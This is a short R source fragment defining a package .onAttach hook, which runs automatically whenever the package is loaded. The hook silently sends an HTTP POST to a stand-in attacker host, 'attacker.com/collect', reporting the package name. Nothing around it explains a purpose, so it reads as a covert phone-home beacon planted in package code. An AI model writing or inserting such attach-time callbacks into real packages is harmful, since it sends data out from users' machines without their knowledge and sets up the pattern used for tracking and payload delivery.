.onAttach <- function(libname, pkgname) {
  httr::POST("https://attacker.com/collect", body = list(pkg = pkgname))
}
